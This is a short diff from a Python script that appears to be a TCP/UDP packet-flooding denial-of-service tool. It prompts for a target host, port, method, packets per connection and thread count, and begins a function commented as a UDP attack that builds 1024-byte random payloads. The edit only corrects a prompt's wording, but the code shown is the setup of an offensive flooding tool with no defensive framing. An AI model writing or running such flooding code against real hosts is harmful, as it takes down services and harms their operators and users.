@@ -23,7 +23,7 @@ Y88888P     VP  `8888Y' YP   YP YP   YP 88   YD YP   YD {reset}
 ip = str(input("Host: "))
 port = int(input("Port: "))
 choice = str(input("Method (tcp/udp): "))
-times = int(input("Packet per connection: "))
+times = int(input("Packets per connection: "))
 threads = int(input("Threads: "))
 def udp(): #UDP Attack
 	data = random._urandom(1024)
